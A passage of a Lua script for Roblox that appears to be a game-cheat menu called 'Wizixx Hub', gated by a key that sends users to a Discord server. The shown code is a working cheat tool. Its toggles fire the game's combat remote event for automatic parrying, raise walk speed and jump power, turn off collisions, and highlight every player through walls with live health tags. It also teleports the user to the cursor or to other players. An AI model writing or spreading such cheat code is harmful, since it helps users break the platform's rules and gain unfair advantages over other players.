                if lastHealth[plr] and lastHealth[plr] > 0 and hum.Health <= 0 then
                    Functions.KillCounter = Functions.KillCounter + 1
                    KillCounterLabel.Text = "💀 Kills: " .. Functions.KillCounter
                    PlaySound(KillSounds[Functions.KillSound], Functions.Volume)
                end
                lastHealth[plr] = hum.Health
            end
        end
    end)
    CreateToggle(tabs["⚔️ COMBAT"].frame, "🛡️ Auto Parry", function(state)
        Functions.AutoParry = state
        if state then
            local parryEvent = nil
            local events = ReplicatedStorage:FindFirstChild("Events")
            if events then
                parryEvent = events:FindFirstChild("CombatEvent") or events:FindFirstChild("ParryEvent")
            end
            local function CheckForHitboxes()
                if not Functions.AutoParry or not LP.Character then return end
                local root = LP.Character.HumanoidRootPart
                if not root then return end
                for _, obj in pairs(Workspace:GetDescendants()) do
                    if obj:IsA("Part") or obj:IsA("MeshPart") then
                        local name = obj.Name or ""
                        if name:find("Punch") or name:find("Muda") or name:find("Barrage") or name:find("Hitbox") then
                            if (obj.Position - root.Position).Magnitude < 15 then
                                if parryEvent then
                                    pcall(function()
                                        parryEvent:FireServer("Parry", LP.Character)
                                        PlaySound(HitSounds[Functions.HitSound], Functions.Volume)
                                    end)
                                    break
                                end
                            end
                        end
                    end
                end
            end
            local parryLoop = RunService.Heartbeat:Connect(CheckForHitboxes)
            Functions.ParryConnection = parryLoop
        else
            if Functions.ParryConnection then
                Functions.ParryConnection:Disconnect()
                Functions.ParryConnection = nil
            end
        end
    end)
    CreateToggle(tabs["🦶 MOVEMENT"].frame, "⚡ Speed", function(state)
        Functions.Speed = state
        local hum = LP.Character and LP.Character:FindFirstChild("Humanoid")
        if hum then
            hum.WalkSpeed = state and 120 or 16
        end
    end)
    CreateToggle(tabs["🦶 MOVEMENT"].frame, "🦘 Jump Power", function(state)
        Functions.JumpPower = state
        local hum = LP.Character and LP.Character:FindFirstChild("Humanoid")
        if hum then
            hum.JumpPower = state and 100 or 50
        end
    end)
    CreateToggle(tabs["🦶 MOVEMENT"].frame, "👻 NoClip", function(state)
        Functions.NoClip = state
        if state then
            local noclipConnection
            noclipConnection = RunService.Stepped:Connect(function()
                if not Functions.NoClip or not LP.Character then noclipConnection:Disconnect() return end
                for _, part in pairs(LP.Character:GetDescendants()) do
                    if part:IsA("BasePart") then
                        part.CanCollide = false
                    end
                end
            end)
        end
    end)
    CreateToggle(tabs["🦶 MOVEMENT"].frame, "🦘 Infinite Jump", function(state)
        Functions.InfiniteJump = state
        if state then
            local jumpConnection
            jumpConnection = UserInputService.JumpRequest:Connect(function()
                if Functions.InfiniteJump and LP.Character and LP.Character:FindFirstChild("Humanoid") then
                    LP.Character.Humanoid:ChangeState("Jumping")
                end
            end)
        end
    end)
    CreateToggle(tabs["👁️ VISUAL"].frame, "👁️ ESP", function(state)
        Functions.ESP = state
        local function AddESP(obj)
            pcall(function()
                local highlight = Instance.new("Highlight")
                highlight.Name = "Wizixx_ESP"
                highlight.FillColor = Color3.fromRGB(255, 0, 0)
                highlight.OutlineColor = Color3.fromRGB(255, 255, 255)
                highlight.FillTransparency = 0.3
                highlight.Parent = obj
                table.insert(ESPHighlights, highlight)
            end)
        end
        if state then
            for _, plr in pairs(Players:GetPlayers()) do
                if plr.Character then
                    AddESP(plr.Character)
                end
            end
        else
            for _, v in pairs(ESPHighlights) do
                pcall(function() v:Destroy() end)
            end
            ESPHighlights = {}
        end
    end)
    CreateToggle(tabs["👁️ VISUAL"].frame, "🏷️ Name Tags", function(state)
        Functions.NameTags = state
        if state then
            local function AddNameTag(plr)
                if plr == LP then return end
                if not plr.Character then return end
                local head = plr.Character:FindFirstChild("Head")
                if not head then return end
                local billboard = Instance.new("BillboardGui")
                billboard.Name = "Wizixx_NameTag"
                billboard.Size = UDim2.new(0, 100, 0, 40)
                billboard.StudsOffset = Vector3.new(0, 3, 0)
                billboard.AlwaysOnTop = true
                billboard.Parent = head
                local nameLabel = Instance.new("TextLabel")
                nameLabel.Size = UDim2.new(1, 0, 0.5, 0)
                nameLabel.Position = UDim2.new(0, 0, 0, 0)
                nameLabel.BackgroundTransparency = 1
                nameLabel.Text = plr.Name
                nameLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
                nameLabel.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
                nameLabel.TextStrokeTransparency = 0
                nameLabel.TextSize = 14
                nameLabel.Font = Enum.Font.GothamBold
                nameLabel.Parent = billboard
                local hpLabel = Instance.new("TextLabel")
                hpLabel.Size = UDim2.new(1, 0, 0.5, 0)
                hpLabel.Position = UDim2.new(0, 0, 0.5, 0)
                hpLabel.BackgroundTransparency = 1
                hpLabel.Text = "HP: 100"
                hpLabel.TextColor3 = Color3.fromRGB(0, 255, 0)
                hpLabel.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
                hpLabel.TextStrokeTransparency = 0
                hpLabel.TextSize = 12
                hpLabel.Font = Enum.Font.Gotham
                hpLabel.Parent = billboard
                table.insert(NameTagList, {billboard = billboard, hpLabel = hpLabel, plr = plr})
            end
            for _, plr in pairs(Players:GetPlayers()) do
                AddNameTag(plr)
            end
            local hpConnection
            hpConnection = RunService.Heartbeat:Connect(function()
                if not Functions.NameTags then hpConnection:Disconnect() return end
                for _, tag in pairs(NameTagList) do
                    if tag.plr and tag.plr.Character and tag.plr.Character:FindFirstChild("Humanoid") then
                        local hum = tag.plr.Character.Humanoid
                        tag.hpLabel.Text = "HP: " .. math.floor(hum.Health)
                        tag.hpLabel.TextColor3 = Color3.fromRGB(255 * (1 - hum.Health/hum.MaxHealth), 255 * (hum.Health/hum.MaxHealth), 0)
                    end
                end
            end)
        else
            for _, v in pairs(NameTagList) do
                pcall(function() v.billboard:Destroy() end)
            end
            NameTagList = {}
        end
    end)
    local ClearMarkersButton = Instance.new("TextButton")
    ClearMarkersButton.Size = UDim2.new(1, -10, 0, 35)
    ClearMarkersButton.BackgroundColor3 = Color3.fromRGB(100, 0, 0)
    ClearMarkersButton.Text = "🧹 Clear All Markers"
    ClearMarkersButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    ClearMarkersButton.TextSize = 14
    ClearMarkersButton.Font = Enum.Font.GothamBold
    ClearMarkersButton.Parent = tabs["👁️ VISUAL"].frame
    local ClearButtonCorner = Instance.new("UICorner")
    ClearButtonCorner.CornerRadius = UDim.new(0, 6)
    ClearButtonCorner.Parent = ClearMarkersButton
    ClearMarkersButton.MouseButton1Click:Connect(function()
        for _, v in pairs(ESPHighlights) do
            pcall(function() v:Destroy() end)
        end
        ESPHighlights = {}
        for _, v in pairs(NameTagList) do
            pcall(function() v.billboard:Destroy() end)
        end
        NameTagList = {}
        for _, v in pairs(ScreenGui:GetChildren()) do
            if v.Name == "DeathMarker" then
                v:Destroy()
            end
        end
    end)
    CreateToggle(tabs["🌍 WORLD"].frame, "🖱️ Click TP", function(state)
        Functions.ClickTP = state
        if state then
            local holdingTool = false
            local function checkTool()
                if LP.Character then
                    for _, tool in pairs(LP.Character:GetChildren()) do
                        if tool:IsA("Tool") and tool:FindFirstChild("Handle") then
                            return true
                        end
                    end
                end
                return false
            end
            Mouse.Button1Down:Connect(function()
                if Functions.ClickTP and checkTool() then
                    holdingTool = true
                end
            end)
            Mouse.Button1Up:Connect(function()
                holdingTool = false
            end)
            Mouse.Button1Click:Connect(function()
                if holdingTool and Mouse.Hit and LP.Character and LP.Character:FindFirstChild("HumanoidRootPart") then
                    LP.Character.HumanoidRootPart.CFrame = Mouse.Hit + Vector3.new(0, 3, 0)
                    PlaySound(HitSounds.Beep, Functions.Volume)
                end
            end)
        end
    end)
    CreateToggle(tabs["🌍 WORLD"].frame, "👤 TP to Player", function(state)
        Functions.TeleportToPlayer = state
        if state then
            local playerList = Instance.new("Frame")
            playerList.Size = UDim2.new(0, 200, 0, 300)
            playerList.Position = UDim2.new(0, 10, 0, 100)
            playerList.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
            playerList.Parent = ScreenGui
            local listScroll = Instance.new("ScrollingFrame")
            listScroll.Size = UDim2.new(1, -10, 1, -10)
            listScroll.Position = UDim2.new(0, 5, 0, 5)
            listScroll.BackgroundTransparency = 1
            listScroll.Parent = playerList
            local y = 0
            for _, plr in pairs(Players:GetPlayers()) do
                if plr ~= LP then
                    local btn = Instance.new("TextButton")
                    btn.Size = UDim2.new(1, 0, 0, 30)
                    btn.Position = UDim2.new(0, 0, 0, y)
                    btn.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
                    btn.Text = plr.Name
                    btn.TextColor3 = Color3.fromRGB(255, 255, 255)
                    btn.Parent = listScroll
                    btn.MouseButton1Click:Connect(function()
                        if LP.Character and plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
                            LP.Character.HumanoidRootPart.CFrame = plr.Character.HumanoidRootPart.CFrame + Vector3.new(0, 5, 0)
                            PlaySound(HitSounds.Beep, Functions.Volume)
                        end
                    end)
                    y = y + 35
                end
            end
            listScroll.CanvasSize = UDim2.new(0, 0, 0, y)
            Functions.TeleportList = playerList
        else
            if Functions.TeleportList then
                Functions.TeleportList:Destroy()
                Functions.TeleportList = nil
            end
        end
    end)
    CreateToggle(tabs["🌍 WORLD"].frame, "📍 TP to Cursor (T)", function(state)
        Functions.TeleportToCursor = state
        if state then
            local tpConnection
            tpConnection = UserInputService.InputBegan:Connect(function(input)
                if input.KeyCode == Enum.KeyCode.T and Functions.TeleportToCursor then
                    if LP.Character and LP.Character:FindFirstChild("HumanoidRootPart") and Mouse.Hit then
                        LP.Character.HumanoidRootPart.CFrame = Mouse.Hit + Vector3.new(0, 3, 0)
                        PlaySound(HitSounds.Beep, Functions.Volume)
                    end
                end
            end)
        end
    end)
    CreateToggle(tabs["🎮 MISC"].frame, "🔄 Auto Respawn", function(state)
        Functions.AutoRespawn = state
        if state then
            local respawnConnection
            respawnConnection = RunService.Heartbeat:Connect(function()
                if not Functions.AutoRespawn then respawnConnection:Disconnect() return end
                if not LP.Character or not LP.Character:FindFirstChild("Humanoid") or LP.Character.Humanoid.Health <= 0 then
                    Functions.DeathCounter = Functions.DeathCounter + 1
                    task.wait(2)
                    LP:LoadCharacter()
                end
            end)
        end
    end)
    UserInputService.InputBegan:Connect(function(input)
        if input.KeyCode == Enum.KeyCode.RightShift then
            MainFrame.Visible = not MainFrame.Visible
        end
    end)
    for _, tab in pairs(tabs) do
        tab.frame.CanvasSize = UDim2.new(0, 0, 0, tab.layout.AbsoluteContentSize.Y + 20)
    end
    print([[
    ╔═══════════════════════════════════════╗
    ║     WIZIXX HUB [14.02.2026]           ║
    ╠═══════════════════════════════════════╣
    ║ ✅ KEY SYSTEM ACTIVATED                ║
    ║ ✅ 35+ FUNCTIONS LOADED                ║
    ╚═══════════════════════════════════════╝
    ]])
end
KeyButton.MouseButton1Click:Connect(function()
    local enteredKey = KeyTextBox.Text
    KeyStatus.Text = "Checking key..."
    KeyStatus.TextColor3 = Color3.fromRGB(255, 255, 0)
    task.wait(0.5)
    if CheckKey(enteredKey) then
        KeyStatus.Text = "✅ Correct key! Loading Wizixx Hub..."
        KeyStatus.TextColor3 = Color3.fromRGB(0, 255, 0)
        task.wait(1)
        LoadMainScript()
    else
        KeyStatus.Text = "❌ Invalid key! Kicking..."
        KeyStatus.TextColor3 = Color3.fromRGB(255, 0, 0)
        task.wait(1.5)
        game:GetService("Players").LocalPlayer:Kick("Invalid key! Join discord for the correct key.")
    end
end)
KeyTextBox.FocusLost:Connect(function(enterPressed)
    if enterPressed then
        KeyButton.MouseButton1Click:Fire()
    end
end)
print("🔐 Wizixx Key System loaded. Please enter the key.")
